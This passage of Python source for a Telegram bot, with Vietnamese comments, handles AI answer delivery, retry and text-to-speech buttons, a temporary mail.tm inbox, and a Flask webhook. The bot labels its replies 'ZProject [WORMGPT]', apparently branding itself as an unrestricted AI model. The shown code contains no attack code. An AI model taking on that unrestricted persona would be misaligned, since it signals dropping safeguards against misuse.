        bot.voice_map[reply_id] = result # Lưu toàn bộ kết quả gốc cho TTS

    # Tính toán tổng độ dài của nội dung (thô) để quyết định gửi file hay gửi tin nhắn
    total_raw_length = 0
    full_content_for_file = []
    for part in response_parts_structured:
        total_raw_length += len(part["raw_content"])
        if part["type"] == "text":
            full_content_for_file.append(part["raw_content"])
        elif part["type"] == "code":
            full_content_for_file.append(f"\n```\n{part['raw_content']}\n```\n")

    # Telegram có giới hạn 4096 ký tự cho tin nhắn và 1024 cho caption ảnh/document.
    # Sử dụng ngưỡng an toàn thấp hơn để quyết định gửi file.
    # Nếu có nhiều code block hoặc văn bản rất dài, gửi file sẽ tốt hơn.
    if total_raw_length > 1500 or any(p["type"] == "code" for p in response_parts_structured):
        filename = f"zproject_{reply_id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("".join(full_content_for_file)) # Viết toàn bộ nội dung đã gom lại

        with open(filename, "rb") as f:
            try:
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"📄 Trả lời quá dài hoặc có code block! Mình đã đóng gói vào file <code>{filename}</code> nha {html_escape(message.from_user.first_name)}!\n\n"
                            f"<i>Vui lòng tải xuống để xem toàn bộ nội dung.</i>",
                    parse_mode="HTML",
                    reply_to_message_id=message.message_id
                )
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send document replying to message {message.message_id}: {e}. Sending without reply_to.")
                f.seek(0)
                bot.send_document(
                    message.chat.id,
                    f,
                    caption=f"📄 Trả lời quá dài hoặc có code block! Mình đã đóng gói vào file <code>{filename}</code> nha {html_escape(message.from_user.first_name)}!\n\n"
                            f"<i>Vui lòng tải xuống để xem toàn bộ nội dung.</i>",
                    parse_mode="HTML"
                )
        os.remove(filename)
        # Xóa tin nhắn "đang xử lý" ban đầu
        try:
            bot.delete_message(msg_status.chat.id, msg_status.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to delete status message {msg_status.message_id}: {e}")

    else: # Gửi tin nhắn thông thường nếu không quá dài hoặc không có code block riêng
        main_markup = build_reply_button(user_id, prompt, reply_id)
        current_message_text = f"🤖 <i>ZProject [WORMGPT] trả lời:</i>\n\n"
        
        combined_text_for_telegram = ""
        for part in response_parts_structured:
            if part["type"] == "text":
                combined_text_for_telegram += part["content"] + "\n\n" # Thêm xuống dòng giữa các đoạn văn bản
            elif part["type"] == "code":
                # Thêm nút copy code vào markup chính cho phần code đó
                copy_id = uuid.uuid4().hex[:8]
                with code_snippets_lock: # Bảo vệ truy cập bot.code_snippets
                    bot.code_snippets[copy_id] = part["raw_content"]
                
                # InlineKeyboardMarkup mới cho mỗi code block
                code_markup = InlineKeyboardMarkup()
                code_markup.add(InlineKeyboardButton("📄 Sao chép Code", callback_data=f"copycode|{copy_id}"))

                # Gửi phần code block riêng với nút copy của nó
                try:
                    # Gửi text trước nếu có, rồi gửi code sau
                    if combined_text_for_telegram.strip():
                        bot.edit_message_text( # Cố gắng edit tin nhắn status nếu chưa bị thay thế
                            current_message_text + combined_text_for_telegram.strip(),
                            msg_status.chat.id,
                            msg_status.message_id,
                            parse_mode="HTML"
                        )
                        msg_status = None # Đã sử dụng tin nhắn status
                    
                    bot.send_message(
                        message.chat.id,
                        text=f"<b>Code:</b>\n{part['content']}", # Đã là HTML escaped
                        parse_mode="HTML",
                        reply_markup=code_markup,
                        reply_to_message_id=message.message_id # Reply về tin nhắn gốc
                    )
                except telebot.apihelper.ApiTelegramException as e:
                    logging.warning(f"Failed to send code part in chat {message.chat.id}: {e}. Sending without reply_to.")
                    bot.send_message(
                        message.chat.id,
                        text=f"<b>Code:</b>\n{part['content']}",
                        parse_mode="HTML",
                        reply_markup=code_markup
                    )
                combined_text_for_telegram = "" # Reset sau khi gửi code
        
        # Gửi phần văn bản cuối cùng (nếu có) và các nút chung
        final_response_text = current_message_text + combined_text_for_telegram.strip()
        
        try:
            if msg_status: # Nếu tin nhắn status ban đầu vẫn còn
                bot.edit_message_text(
                    final_response_text,
                    msg_status.chat.id,
                    msg_status.message_id,
                    parse_mode="HTML",
                    reply_markup=main_markup
                )
            else: # Nếu tin nhắn status đã được sử dụng (ví dụ để gửi phần text trước code)
                bot.send_message(
                    message.chat.id,
                    text=final_response_text,
                    parse_mode="HTML",
                    reply_markup=main_markup,
                    reply_to_message_id=message.message_id # Reply về tin nhắn gốc
                )
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to send/edit final message in chat {message.chat.id}: {e}. Sending as new message.")
            send_message_robustly(
                message.chat.id,
                text=final_response_text,
                parse_mode="HTML",
                reply_markup=main_markup,
                reply_to_message_id=message.message_id
            )
        except Exception as e:
            logging.error(f"Error in final message sending for /ask: {e}")
            send_message_robustly(message.chat.id, text=f"❌ Đã xảy ra lỗi khi gửi kết quả: {e}", parse_mode="HTML", reply_to_message_id=message.message_id)


# --- NÚT CALLBACK CỦA BOT ZPROJECT ---

@bot.callback_query_handler(func=lambda call: call.data.startswith("retry|"))
def retry_button(call):
    """Xử lý nút 'Trả lời lại' từ câu hỏi /ask."""
    try:
        _, uid, question = call.data.split("|", 2)
        if str(call.from_user.id) != uid:
            return bot.answer_callback_query(call.id, "🚫 Bạn không phải người yêu cầu câu hỏi này.", show_alert=True)

        # Tạo một đối tượng message giả lập để truyền vào ask_command
        msg = SimpleNamespace(
            chat=call.message.chat,
            message_id=call.message.message_id,
            text="/ask " + question,
            from_user=call.from_user,
            reply_to_message=None # Giả định không có reply_to_message khi retry
        )

        bot.answer_callback_query(call.id, "🔁 Đang thử lại câu hỏi...")
        try:
            bot.edit_message_text("🤖 Đang xử lý lại...", call.message.chat.id, call.message.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            logging.warning(f"Failed to edit message {call.message.message_id} on retry: {e}. Sending new 'thinking' message.")
            bot.send_message(call.message.chat.id, "🤖 Đang xử lý lại...", reply_to_message_id=call.message.message_id)

        # Gọi hàm xử lý lệnh /ask (được bọc bởi decorator @increment_interaction_count)
        # Chạy trong một luồng riêng để không chặn callback
        Thread(target=ask_command, args=(msg,)).start()

    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi thử lại!", show_alert=True)
        logging.error(f"[RETRY] Lỗi: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("tts|"))
def tts_button(call):
    """Xử lý nút 'Chuyển sang Voice' từ câu trả lời /ask."""
    try:
        parts = call.data.split("|")
        uid = parts[1]
        reply_id = parts[2]

        if str(call.from_user.id) != uid:
            return bot.answer_callback_query(call.id, "🚫 Bạn không phải người yêu cầu voice này.", show_alert=True)

        with voice_map_lock: # Bảo vệ truy cập bot.voice_map
            answer = bot.voice_map.get(reply_id)
        if not answer:
            return bot.answer_callback_query(call.id, "❌ Không tìm thấy dữ liệu giọng nói.", show_alert=True)

        # Xóa các định dạng HTML và Markdown để gTTS chỉ nhận văn bản thuần
        clean_text = re.sub(r"<code>.*?</code>", "", answer, flags=re.DOTALL)
        clean_text = re.sub(r"<[^>]+>", "", clean_text)
        clean_text = re.sub(r"```.*?```", "", clean_text, flags=re.DOTALL)
        clean_text = clean_text.replace('"', '').replace("'", '')

        text_to_speak = clean_text.strip()

        if not text_to_speak or len(text_to_speak) < 5:
            return bot.answer_callback_query(call.id, "❗ Nội dung quá ngắn hoặc rỗng để chuyển voice.", show_alert=True)

        filename = f"zproject_tts_{reply_id}.mp3"
        tts = gTTS(text=text_to_speak, lang="vi", slow=False)
        tts.save(filename)

        with open(filename, "rb") as f:
            try:
                bot.send_voice(call.message.chat.id, f, caption="🗣️ Đây là Voice ZProject:v", reply_to_message_id=call.message.message_id)
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send voice replying to message {call.message.message_id}: {e}. Sending without reply_to.")
                f.seek(0)
                bot.send_voice(call.message.chat.id, f, caption="🗣️ Đây là Voice ZProject:v")
        os.remove(filename)
        bot.answer_callback_query(call.id, "🎧 Voice đã được gửi!")
    except Exception as e:
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi tạo voice.", show_alert=True)
        logging.error(f"[TTS] Lỗi: {e}")

# --- NÚT CALLBACK CỦA MAIL.TM ---

def check_mail_owner(call, expected_user_id):
    """Kiểm tra xem người nhấn nút có phải là người đã tạo mail không."""
    # Chuyển expected_user_id sang int để so sánh chính xác
    if call.from_user.id != int(expected_user_id):
        bot.answer_callback_query(call.id, "🚫 Chat Riêng Với Bot Để Dùng Chức Năng Mail10p .", show_alert=True)
        return False
    return True

@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_inbox|"))
def show_inbox_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return

    bot.answer_callback_query(call.id, "Đang tải hộp thư...", show_alert=False)

    text, markup, parse_mode = _get_inbox_content(user_id)

    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
            # Cập nhật trạng thái tin nhắn
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'inbox'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (inbox).")
        else:
            logging.error(f"Lỗi khi chỉnh sửa tin nhắn thành hộp thư cho user {user_id}: {e}")
            # Nếu edit không thành công, thử gửi tin nhắn mới
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            # Xóa trạng thái cũ và thêm trạng thái mới
            with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "❌ Đã có lỗi khi cập nhật hộp thư. Đây là tin nhắn mới.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}
            
    except Exception as e:
        logging.error(f"Lỗi không xác định khi xem hộp thư: {e}")
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi xem hộp thư!", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_refresh|"))
def refresh_inbox_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return

    bot.answer_callback_query(call.id, "Đang làm mới hộp thư...", show_alert=False)

    text, markup, parse_mode = _get_inbox_content(user_id)

    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
            # Cập nhật trạng thái tin nhắn
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'inbox'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (refresh inbox).")
        else:
            logging.error(f"Lỗi khi làm mới hộp thư cho user {user_id}: {e}")
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
                # Xóa trạng thái cũ và thêm trạng thái mới
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "❌ Đã có lỗi khi làm mới hộp thư. Đây là tin nhắn mới.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}
    except Exception as e:
        logging.error(f"Lỗi không xác định khi làm mới hộp thư: {e}")
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi làm mới hộp thư!", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data.startswith("mailtm_back|"))
def back_to_mail_info_button(call):
    user_id = call.message.chat.id
    expected_user_id = call.data.split("|")[1]

    if not check_mail_owner(call, expected_user_id):
        return
    
    bot.answer_callback_query(call.id, "Quay lại thông tin mail...", show_alert=False)

    with user_data_lock: # Bảo vệ truy cập user_data
        info = user_data.get(user_id)

    if not info:
        text = "<i>❌ Bạn chưa tạo email. Gõ /mail10p để tạo nhé!</i>"
        markup = None
        parse_mode = 'HTML'
    else:
        elapsed_time = int(time.time() - info["created_at"])
        remaining_time = 600 - elapsed_time
        if remaining_time > 0:
            minutes = remaining_time // 60
            seconds = remaining_time % 60
            text = (
                f"<blockquote>✅ Mail 10 phút của bạn là:\n"
                f"<code>📧 {info['email']}</code>\n"
                f"⏰ Hết hạn sau {minutes} phút {seconds} giây.</blockquote>"
            )
            markup = build_mail_buttons(user_id, 'mail_info')
            parse_mode = 'HTML'
        else:
            with user_data_lock: # Bảo vệ truy cập user_data khi xóa
                del user_data[user_id]
            text = "⏰ Mail 10 phút của bạn đã hết hạn! Vui lòng tạo mail mới bằng lệnh /mail10p."
            markup = None
            parse_mode = 'HTML'
    
    try:
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=markup
        )
        with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
            # Cập nhật trạng thái tin nhắn
            if call.message.message_id in bot.mail_messages_state:
                bot.mail_messages_state[call.message.message_id]['type'] = 'mail_info'
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" in str(e):
            logging.info(f"Message {call.message.message_id} in chat {call.message.chat.id} was not modified (back to mail info).")
        else:
            logging.error(f"Lỗi khi chỉnh sửa tin nhắn về thông tin mail cho user {user_id}: {e}")
            send_message_robustly(call.message.chat.id, text=text, parse_mode=parse_mode, reply_markup=markup)
            with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
                # Xóa trạng thái cũ và thêm trạng thái mới
                if call.message.message_id in bot.mail_messages_state:
                    del bot.mail_messages_state[call.message.message_id]
                sent_msg = send_message_robustly(call.message.chat.id, "❌ Đã có lỗi khi quay lại thông tin mail. Đây là tin nhắn mới.", parse_mode="HTML")
                if sent_msg:
                    bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
    except Exception as e:
        logging.error(f"Lỗi không xác định khi quay lại thông tin mail: {e}")
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi quay lại thông tin mail!", show_alert=True)

# === Webhook Flask ===
@app.route("/")
def index():
    """Trang chủ đơn giản cho biết bot đang hoạt động."""
    return "<h3>🛰️ ZProject Bot đang hoạt động!</h3>"

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    """Điểm cuối webhook để nhận cập nhật từ Telegram."""
    try:
        # Xử lý update trong một luồng riêng nếu bot được khởi tạo với threaded=True
        update = telebot.types.Update.de_json(request.data.decode("utf-8"))
        bot.process_new_updates([update]) # Khi threaded=True, mỗi update sẽ sinh ra một luồng riêng
        return "OK", 200
    except Exception as e:
        logging.error(f"Lỗi webhook: {e}")
        return "Error", 500


# === Khởi chạy Bot ===
if __name__ == "__main__":
    try:
        bot_proxy_queue, bot_num_threads = init_proxy()
        webhook_info = bot.get_webhook_info()
        current_webhook_url = f"{APP_URL}/{TOKEN}"
        if webhook_info.url != current_webhook_url:
            logging.info(f"Webhook hiện tại ({webhook_info.url}) không khớp với URL mong muốn ({current_webhook_url}). Đang xóa và đặt lại webhook.")
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=current_webhook_url)
            logging.info(f"Webhook đã được đặt tới: {current_webhook_url}")
        else:
            logging.info(f"Webhook đã được đặt chính xác tới: {current_webhook_url}")

        port = int(os.environ.get("PORT", 10000))
        app.run(host="0.0.0.0", port=port)
    except Exception as e:
        logging.critical(f"Lỗi nghiêm trọng khi khởi động bot: {e}")

